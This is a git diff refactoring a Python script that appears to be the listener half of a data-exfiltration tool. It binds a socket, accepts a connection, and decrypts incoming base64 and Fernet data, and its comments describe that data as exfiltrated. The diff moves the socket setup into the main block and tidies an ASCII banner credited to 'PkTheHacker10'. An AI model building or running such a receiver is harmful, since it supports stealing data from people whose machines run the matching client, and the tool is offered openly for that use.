@@ -11,16 +11,6 @@ PORT=12345
 BUFFER_SIZE = 1234
 PASSWORD = b"password" # Change password you want .
 
-sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-
-try:
-    sock.bind((HOST,PORT))
-    sock.listen()
-except Exception as E:
-    print(f"Exception : {E}")
-
-conn,addr=sock.accept()
-
 def decrypt_message(b64_data):
     # Function to decrypt the exfiltrated data.
     raw_data = base64.b64decode(b64_data)
@@ -38,7 +28,7 @@ def decrypt_message(b64_data):
     decrypted = fernet.decrypt(encrypted_message)
     return decrypted.decode()
 
-def receive_data():
+def receive_data(conn):
     # Function to receive exfiltrated data.
     while True:
         try:
@@ -63,12 +53,22 @@ if __name__ == "__main__":
                      _                              
          ___ ___ ___| |_    ___ ___ ___ _ _ ___ ___ 
         | . |  _| .'| . |  |_ -| -_|  _| | | -_|  _|
-        |_  |_| |__,|___|  |___|___|_|  \_//|___|_|  
+        |_  |_| |__,|___|  |___|___|_|  \\_/|___|_|  
         |___|      
 
                     Author :  Pevinkumar A 
-                    GitHub :  PkTheHacker10                                 
-"""
-    receive_data()
+                    GitHub :  PkTheHacker10\n"""
+    print(banner)
+    try:
+        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        sock.bind((HOST,PORT))
+        sock.listen()
+
+    except Exception as E:
+        print(f"Exception : {E}")
+
+    conn,addr=sock.accept()
+    print(f"Connection established from {addr[0]}:{addr[1]}")
+    receive_data(conn)
 
 
